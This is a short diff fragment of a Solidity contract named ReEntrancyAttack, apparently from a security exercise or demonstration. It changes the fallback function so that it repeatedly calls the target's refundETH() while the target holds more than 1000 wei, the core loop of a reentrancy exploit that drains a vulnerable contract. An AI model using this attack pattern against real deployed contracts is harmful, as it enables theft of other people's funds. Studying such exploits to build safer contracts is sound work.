@@ -14,8 +14,8 @@ contract ReEntrancyAttack {
     }
 
     fallback() external payable {
-        if (address(targetA).balance>0){
-        reEnter();}
+        if (address(targetA).balance>1000){
+        target.refundETH();}
     }
 
     function ReentranceAttack1() public{
